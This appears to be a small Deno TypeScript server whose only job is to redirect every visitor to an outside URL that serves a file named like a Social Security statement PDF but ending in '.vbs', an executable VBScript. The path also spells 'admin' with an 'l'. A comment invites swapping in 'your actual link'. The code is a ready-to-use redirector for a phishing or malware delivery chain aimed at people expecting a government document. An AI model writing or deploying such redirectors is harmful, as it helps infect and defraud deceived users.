import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://tacengineers.com/secure/ssa/admln/SSA-Statement-pdf.vbs/", // Replace this with your actual link
    },
  });
});
